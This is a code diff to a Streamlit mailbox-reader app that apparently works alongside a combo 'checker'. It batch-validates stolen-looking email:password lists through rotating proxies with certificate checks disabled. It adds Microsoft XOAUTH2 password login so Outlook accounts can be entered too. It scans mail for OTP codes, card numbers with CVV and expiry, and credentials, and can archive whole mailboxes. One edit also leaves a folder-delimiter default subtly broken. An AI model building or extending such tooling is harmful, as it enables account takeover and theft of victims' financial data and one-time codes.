@@ -25,6 +25,15 @@ except ImportError:
         domain = email.split("@")[-1].lower() if "@" in email else ""
         return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
 
+# --- ms_oauth.py : Microsoft XOAUTH2 (personal accounts) --------------------
+try:
+    import ms_oauth as _ms_oauth
+    _MS_OAUTH_OK = True
+    _MS_IMAP_HOSTS = set(_ms_oauth.MS_IMAP_HOSTS)
+except Exception:
+    _ms_oauth = None
+    _MS_OAUTH_OK = False
+    _MS_IMAP_HOSTS = {"outlook.office365.com", "imap-mail.outlook.com"}
 
 # ============================================================================
 # PROVIDER KNOWLEDGE  (legacy ISP domains whose MX != their IMAP host)
@@ -65,7 +74,6 @@ ZERO_ACCESS_PROVIDERS = {
     "tuta.com", "tutanota.com", "tuta.io",
 }
 
-
 def candidate_hosts(email_addr: str, override_host: str = "") -> List[str]:
     """Ordered, de-duplicated host candidates. Never returns an empty list."""
     email_addr = (email_addr or "").strip()
@@ -98,13 +106,11 @@ def candidate_hosts(email_addr: str, override_host: str = "") -> List[str]:
 
     return ordered
 
-
 def username_candidates(email_addr: str) -> List[str]:
     """Full address first, then the bare local part.
 
     Legacy ISP servers (Zimbra / cPanel / Dovecot deployments that predate
-    full-address logins) authenticate on the local part only. Montevideo COMM
-    documents exactly this: "Nombre de usuario: jperez".
+    full-address logins) authenticate on the local part only.
     """
     email_addr = (email_addr or "").strip()
     if not email_addr:
@@ -116,13 +122,8 @@ def username_candidates(email_addr: str) -> List[str]:
             out.append(local)
     return list(dict.fromkeys(out))
 
-
 # ============================================================================
 # SHARED THEME ENGINE
-#
-# Reads/writes the SAME theme.json the main checker (app.py) uses, so whatever
-# preset and colours are chosen in the checker's Theme Studio apply here too:
-# hero banner, tabs, buttons, metrics, expanders, inputs, log boxes.
 # ============================================================================
 
 _THIS_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -147,7 +148,6 @@ THEME_PRESETS = {
 
 DEFAULT_PRESET = "Aurora"
 
-
 def _lum(hex_color: str) -> float:
     try:
         h = str(hex_color).lstrip("#")
@@ -155,7 +155,6 @@ def _lum(hex_color: str) -> float:
         return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
     except Exception:
         return 0.0
-
 
 def default_theme() -> dict:
     p = THEME_PRESETS[DEFAULT_PRESET]
@@ -165,7 +164,6 @@ def default_theme() -> dict:
         "bg": p["bg"], "panel": p["panel"], "text": p["text"],
         "radius": 14, "glow": True, "animate": True, "glass": True, "colorize_logs": True,
     }
-
 
 def _theme_candidates() -> List[str]:
     cands = [THEME_FILE, os.path.abspath("theme.json")]
@@ -179,7 +177,6 @@ def _theme_candidates() -> List[str]:
             seen.add(ap)
             out.append(c)
     return out
-
 
 def load_theme() -> dict:
     """Same file app.py writes. Falls back to defaults if absent/unreadable."""
@@ -197,7 +194,6 @@ def load_theme() -> dict:
             continue
     return base
 
-
 def save_theme(th: dict) -> None:
     """Writes back to the shared file so the checker picks the change up too."""
     for path in (_theme_candidates()[:1] or ["theme.json"]):
@@ -208,10 +204,8 @@ def save_theme(th: dict) -> None:
         except Exception:
             continue
 
-
 def is_light(th: dict) -> bool:
     return _lum(th.get("bg", "#000000")) > 0.6
-
 
 def theme_css(th: dict) -> str:
     g1, g2 = th["g1"], th["g2"]
@@ -352,7 +346,6 @@ def theme_css(th: dict) -> str:
 </style>
 """
 
-
 def hero(title: str, subtitle: str = "", tags: List[str] = None) -> None:
     tag_html = "".join(f'<span class="bb-tag">{html.escape(t)}</span>' for t in (tags or []))
     st.markdown(
@@ -361,7 +354,6 @@ def hero(title: str, subtitle: str = "", tags: List[str] = None) -> None:
         unsafe_allow_html=True,
     )
 
-
 def section(icon: str, title: str, subtitle: str = "") -> None:
     sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
     st.markdown(
@@ -369,7 +361,6 @@ def section(icon: str, title: str, subtitle: str = "") -> None:
         f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
         unsafe_allow_html=True,
     )
-
 
 # Dynamic Proxy Auto-Fetch Engine
 def load_app_proxies() -> List[dict]:
@@ -419,7 +410,6 @@ def load_app_proxies() -> List[dict]:
 
     return dynamic_pool
 
-
 # Page Configuration & Keep-Alive Injector
 st.set_page_config(
     page_title="Bobito Mailbox Reader & Portal Hub",
@@ -444,8 +434,6 @@ THEME = load_theme()
 st.markdown(theme_css(THEME), unsafe_allow_html=True)
 
 # --- Theme control (writes the same file the checker reads) ---
-# Same pattern as app.py: pre-seed widget keys, create widgets with no
-# defaults, and mutate widget keys only from on_change callbacks.
 with st.sidebar.expander("🎨 Theme (synced with checker)", expanded=False):
     _names = list(THEME_PRESETS.keys())
 
@@ -509,7 +497,6 @@ DEFAULT_APP_CONFIG = {
     "allow_self_signed": True,
 }
 
-
 def load_app_config():
     if os.path.exists(APP_CONFIG_FILE):
         try:
@@ -522,7 +509,6 @@ def load_app_config():
             pass
     return DEFAULT_APP_CONFIG.copy()
 
-
 def save_app_config(config_dict):
     try:
         with open(APP_CONFIG_FILE, "w", encoding="utf-8") as f:
@@ -530,14 +516,12 @@ def save_app_config(config_dict):
     except Exception:
         pass
 
-
 def save_last_account(account_combo):
     try:
         with open(LAST_ACCOUNT_FILE, "w", encoding="utf-8") as f:
             f.write(account_combo)
     except Exception:
         pass
-
 
 def load_last_account():
     if os.path.exists(LAST_ACCOUNT_FILE):
@@ -547,7 +531,6 @@ def load_last_account():
         except Exception:
             pass
     return ""
-
 
 def save_session_cache():
     try:
@@ -583,7 +566,6 @@ def save_session_cache():
     except Exception:
         pass
 
-
 def load_session_cache():
     if os.path.exists(SESSION_CACHE_FILE):
         try:
@@ -608,7 +590,6 @@ def load_session_cache():
                         st.session_state[k] = v
         except Exception:
             pass
-
 
 # Initialize Session Config
 if "app_config" not in st.session_state:
@@ -676,28 +657,22 @@ if "connected_account_combo" not in st.session_state:
 if "reader_use_proxy" not in st.session_state:
     st.session_state.reader_use_proxy = False
 
-
 def log(msg):
     st.session_state.mb_log.insert(0, msg)
     st.session_state.mb_log = st.session_state.mb_log[:50]
     save_session_cache()
 
-
 def debug_log(msg):
     st.session_state.folder_debug_logs.append(msg)
-
 
 def bot_log(msg):
     st.session_state.bot_diag_logs.append(msg)
 
-
 def search_log(msg):
     st.session_state.search_diag_logs.append(msg)
 
-
 def otp_log(msg):
     st.session_state.otp_diag_logs.append(msg)
-
 
 # ============================================================================
 # CONNECTION LAYER
@@ -721,7 +696,6 @@ def _mail_tls_context(verify=False):
     except Exception:
         pass
     return ctx
-
 
 def _parse_proxy_str(proxy_str):
     """Accepts host:port | host:port:user:pass | user:pass@host:port | scheme://..."""
@@ -765,7 +739,6 @@ def _parse_proxy_str(proxy_str):
     except Exception:
         return None
 
-
 def _reader_proxy_str():
     """Optional proxy for manual reader connections (sidebar toggle)."""
     try:
@@ -775,7 +748,6 @@ def _reader_proxy_str():
         return pool[0]["proxy"] if pool else None
     except Exception:
         return None
-
 
 def _raw_socket(host, port, timeout, proxy_str=None):
     """Direct socket, or proxied via SOCKS5/HTTP. Falls back to direct if the
@@ -828,7 +800,6 @@ def _raw_socket(host, port, timeout, proxy_str=None):
     except Exception:
         raise last or RuntimeError(f"proxy connect failed for {host}:{port}")
 
-
 def _ensure_file(m):
     """Belt-and-braces: make sure m.file is readable on every Python version."""
     try:
@@ -846,7 +817,6 @@ def _ensure_file(m):
     except Exception:
         pass
 
-
 class _ProxyIMAP4SSL(imaplib.IMAP4_SSL):
     """Implicit-TLS IMAP that routes through the proxy and uses an unverified
     context by default. Overrides _create_socket(), NOT open()."""
@@ -860,7 +830,6 @@ class _ProxyIMAP4SSL(imaplib.IMAP4_SSL):
         raw = _raw_socket(self.host, self.port, timeout, self._proxy_str)
         return _mail_tls_context(self._verify).wrap_socket(raw, server_hostname=self.host)
 
-
 class _ProxyIMAP4(imaplib.IMAP4):
     """Plain IMAP (STARTTLS-capable) with proxy support."""
 
@@ -871,6 +840,13 @@ class _ProxyIMAP4(imaplib.IMAP4):
     def _create_socket(self, timeout):
         return _raw_socket(self.host, self.port, timeout, self._proxy_str)
 
+class _XOAUTH2IMAP4SSL(_ProxyIMAP4SSL):
+    """Adapter so ms_oauth's uniform `insecure=` kwarg reaches _ProxyIMAP4SSL,
+    which spells the same flag `verify=`."""
+
+    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=True):
+        super().__init__(host, port=port, timeout=timeout,
+                         proxy_str=proxy_str, verify=not insecure)
 
 def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
     """Implicit TLS on 993 first, then STARTTLS on 143, then plaintext 143.
@@ -907,7 +883,6 @@ def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
 
     raise last or RuntimeError(f"open_imap failed for {host}:{port}")
 
-
 def _looks_like_auth_error(err_text: str) -> bool:
     s = (err_text or "").lower()
     return any(k in s for k in (
@@ -916,7 +891,6 @@ def _looks_like_auth_error(err_text: str) -> bool:
         "auth failed", "[auth]", "username and password not accepted",
         "logon failure", "bad username", "authenticate failed",
     ))
-
 
 def _looks_like_app_password_error(err_text: str) -> bool:
     s = (err_text or "").lower()
@@ -927,7 +901,6 @@ def _looks_like_app_password_error(err_text: str) -> bool:
         "logindisabled", "login disabled", "two-factor", "2fa", "mfa",
         "enable imap", "imap access is disabled",
     ))
-
 
 def _looks_like_network_error(err_text: str) -> bool:
     s = (err_text or "").lower()
@@ -941,7 +914,6 @@ def _looks_like_network_error(err_text: str) -> bool:
         "self signed certificate", "self-signed certificate", "too many",
         "rate limit", "throttl", "no setter", "dns",
     ))
-
 
 def load_valid():
     """Optimized instant loader: Scans only valid text result files, bypassing heavy log scanning."""
@@ -997,7 +969,6 @@ def load_valid():
 
     return options if options else ["none"]
 
-
 def delete_specific_account_from_storage(target_combo: str):
     search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
     for path in search_files:
@@ -1023,7 +994,6 @@ def delete_specific_account_from_storage(target_combo: str):
             except Exception:
                 pass
 
-
 def clear_all_valid_accounts_storage():
     search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
     for path in search_files:
@@ -1040,7 +1010,6 @@ def clear_all_valid_accounts_storage():
             os.remove(LAST_ACCOUNT_FILE)
         except Exception:
             pass
-
 
 def generate_all_mail_zip():
     buf = io.BytesIO()
@@ -1101,7 +1070,6 @@ def generate_all_mail_zip():
     buf.seek(0)
     return buf.getvalue()
 
-
 def decode_hdr(value):
     try:
         out = []
@@ -1110,7 +1078,6 @@ def decode_hdr(value):
         return "".join(out)
     except Exception:
         return str(value or "")
-
 
 def get_webmail_portal(email_addr):
     if "@" not in email_addr:
@@ -1134,7 +1101,6 @@ def get_webmail_portal(email_addr):
     }
     return portals.get(domain, f"https://www.{domain}")
 
-
 def decode_imap_utf7(s: str) -> str:
     if "&" not in s:
         return s
@@ -1154,7 +1120,6 @@ def decode_imap_utf7(s: str) -> str:
         else:
             res.append(part)
     return "".join(res)
-
 
 def encode_imap_utf7(s: str) -> str:
     parts = []
@@ -1178,7 +1143,6 @@ def encode_imap_utf7(s: str) -> str:
             parts.append(f'&{mod_b64}-')
     return "".join(parts)
 
-
 def clean_display_label(folder_name: str) -> str:
     upper_name = folder_name.upper()
     if upper_name == "INBOX":
@@ -1187,10 +1151,9 @@ def clean_display_label(folder_name: str) -> str:
         return folder_name[6:]
     return folder_name
 
-
 def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
     s = s.strip()
-    flags, delim, raw_name = "", '"."', s
+    flags, delim, raw_name = "", '".', s
     if s.startswith("("):
         end_paren = s.find(")")
         if end_paren != -1:
@@ -1206,11 +1169,9 @@ def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
 
     return flags, delim, raw_name
 
-
 def get_imap_path(selected_ui_folder: str) -> str:
     folder_map = st.session_state.get("folder_map", {})
     return folder_map.get(selected_ui_folder, selected_ui_folder)
-
 
 def list_folders(mail, email_addr: str = "", host_val: str = ""):
     found = set()
@@ -1261,24 +1222,30 @@ def list_folders(mail, email_addr: str = "", host_val: str = ""):
     save_session_cache()
     return display_folders
 
+def connect_and_login(host, port, timeout, proxy_str, users, password, email_addr):
+    """Log in on ONE host.  Microsoft hosts go over XOAUTH2 first.
 
-def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
-    """Connect + login. Tries the full address first, then the bare local part,
-    because legacy ISP servers authenticate on the local part only."""
-    if timeout is None:
-        timeout = st.session_state.app_config.get("connection_timeout", 60)
-    port_val = st.session_state.app_config.get("imap_port", 993)
-    if proxy_str is None:
-        proxy_str = _reader_proxy_str()
+    Returns an OPEN logged-in mailbox, or raises the last error.
+    """
+    if _MS_OAUTH_OK and (host or "").lower() in _MS_IMAP_HOSTS:
+        try:
+            mail, _exists, _claims = _ms_oauth.imap_xoauth2_open(
+                email_addr, password, host, _XOAUTH2IMAP4SSL,
+                port=port, proxy_str=proxy_str, insecure=True, attempt_timeout=timeout)
+            return mail
+        except _ms_oauth.MsTokenTransport:
+            pass                              # network blip -> fall through to basic auth
+        except _ms_oauth.MsTokenRejected:
+            pass                              # MFA / bad password -> fall through
+        except Exception:
+            pass
 
-    users = username_candidates(email_addr)
     last_err = None
-
-    for u_idx, user in enumerate(users):
+    for user in users:
         mail = None
         try:
-            mail = open_imap(host_val, port_val, timeout, proxy_str=proxy_str)
-            mail.login(user, password_val)
+            mail = open_imap(host, port, timeout, proxy_str=proxy_str)
+            mail.login(user, password)
             return mail
         except Exception as ex:
             last_err = ex
@@ -1287,15 +1254,24 @@ def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
                     mail.logout()
                 except Exception:
                     pass
-            # A host-level failure means the username is irrelevant - don't pay
-            # for a second identical connect.
-            if u_idx + 1 < len(users):
-                s = str(ex).lower()
-                if not _looks_like_auth_error(s) and not _looks_like_app_password_error(s):
-                    break
-
+            s = str(ex).lower()
+            if not _looks_like_auth_error(s) and not _looks_like_app_password_error(s):
+                break                          # host-level failure: user is irrelevant
     raise last_err or RuntimeError(f"login failed for {email_addr}")
 
+def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
+    """Connect + login.  Tries the full address first, then the bare local part,
+    because legacy ISP servers authenticate on the local part only.  Microsoft
+    hosts are handled over XOAUTH2 inside connect_and_login()."""
+    if timeout is None:
+        timeout = st.session_state.app_config.get("connection_timeout", 60)
+    port_val = st.session_state.app_config.get("imap_port", 993)
+    if proxy_str is None:
+        proxy_str = _reader_proxy_str()
+
+    users = username_candidates(email_addr)
+    return connect_and_login(host_val, port_val, timeout, proxy_str,
+                             users, password_val, email_addr)
 
 def resolve_active_host(email_addr: str) -> str:
     """Single source of truth for 'which host is this session bound to'."""
@@ -1307,7 +1283,6 @@ def resolve_active_host(email_addr: str) -> str:
         return mh
     cands = candidate_hosts(email_addr) if email_addr else []
     return cands[0] if cands else ""
-
 
 def get_active_mail(email_addr, password_val, host_val):
     current_combo = f"{email_addr}:{password_val}"
@@ -1339,7 +1314,6 @@ def get_active_mail(email_addr, password_val, host_val):
 
     return st.session_state.active_mail
 
-
 def move_message(mail, src_folder_label, mid, dst_folder_label):
     """Correct COPY+DELETE: source folder must be selected for COPY to work."""
     src = encode_imap_utf7(get_imap_path(src_folder_label))
@@ -1356,7 +1330,6 @@ def move_message(mail, src_folder_label, mid, dst_folder_label):
     mail.store(mid, '+FLAGS', '\\Deleted')
     mail.expunge()
 
-
 def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
     extortion_keywords = [
         "bitcoin wallet", "transfer me", "deactivate and remove all malware",
@@ -1365,7 +1338,6 @@ def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
     ]
     combined = f"{subject} {body} {frm}".lower()
     return any(kw in combined for kw in extortion_keywords)
-
 
 def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
     if is_extortion_spam(subject, body, frm):
@@ -1399,7 +1371,6 @@ def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None
 
     return categories
 
-
 def extract_pins_and_links(text):
     pins = []
     for m in re.finditer(r'(?i)(code|otp|pin|passcode|verification|verify)[^\d]{0,12}(\d{4,8})', text or ""):
@@ -1413,13 +1384,12 @@ def extract_pins_and_links(text):
     cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
     return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))
 
-
 def extract_credentials_and_cards(text):
     card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
     cards = re.findall(card_pattern, text)
     cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]
 
-    card_exp = re.findall(r'(?i)(?:exp(?:iry|piration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
+    card_exp = re.findall(r'(?i)(?:exp(?:iry|iration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
     card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)
 
     formatted_cards = []
@@ -1458,7 +1428,6 @@ def extract_credentials_and_cards(text):
 
     return list(dict.fromkeys(formatted_cards)), list(dict.fromkeys(cred_patterns))
 
-
 def clean_boilerplate(text):
     if not text:
         return ""
@@ -1473,7 +1442,6 @@ def clean_boilerplate(text):
         cleaned = re.sub(pat, "", cleaned, flags=flags)
     return cleaned.strip()
 
-
 def should_blacklist_message(msg, blacklist_input) -> bool:
     if not blacklist_input:
         return False
@@ -1485,7 +1453,6 @@ def should_blacklist_message(msg, blacklist_input) -> bool:
         if bw in combined_text:
             return True
     return False
-
 
 def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
     clean_q = query_term.replace('"', '\\"')
@@ -1552,7 +1519,6 @@ def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
         log_func(f"  │   └─ ❌ Batched Scan Exception: {ex4}")
 
     return "NO", [b""]
-
 
 def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str],
                             search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH",
@@ -1719,13 +1685,12 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
     log_func(f"\n🏁 [ENGINE COMPLETE] Total retrieved page messages: {len(messages)} / {total_matched_all_folders} matched | Execution time: {total_elapsed}s")
     return messages
 
-
 # Header (theme-synced from app.py's Theme Studio)
 hero(
     "🚀📥 Bobito Mailbox Reader & Portal Hub Advanced IMAP Client",
     "Interactive Bot Intelligence, Dedicated OTP/Debit Card & Credentials Scanner, "
     "Multi-Field Search, Telegram/Blacklist Filter, Deep Diagnostic Instrumentation.",
-    tags=["OTP Scanner", "Card / Debit", "Telegram Filter", "Bot Purge", "Deep Search"],
+    tags=["OTP Scanner", "Card / Debit", "Telegram Filter", "Bot Purge", "Deep Search", "Microsoft XOAUTH2"],
 )
 
 st.caption(
@@ -1980,23 +1945,10 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                 test_m = None
                 try:
                     trace_steps.append(f"Attempting IMAP TLS -> Host: {h}:{cfg_port} (STARTTLS/plain fallback enabled)")
-                    last_login_err = None
-                    logged_in = False
-                    for u_name in users_to_try:
-                        test_m = open_imap(h, cfg_port, cfg_timeout, proxy_item.get("proxy"))
-                        try:
-                            test_m.login(u_name, pass_val)
-                            logged_in = True
-                            trace_steps.append(f"Authenticated as '{u_name}'")
-                            break
-                        except Exception as lex:
-                            last_login_err = lex
-                            try:
-                                test_m.logout()
-                            except Exception:
-                                pass
-                    if not logged_in:
-                        raise last_login_err or RuntimeError("login failed")
+                    test_m = connect_and_login(h, cfg_port, cfg_timeout,
+                                               proxy_item.get("proxy"),
+                                               users_to_try, pass_val, email_val)
+                    trace_steps.append(f"Authenticated as '{email_val}'")
                     test_m.logout()
                     connected_h = h
                     is_success = True
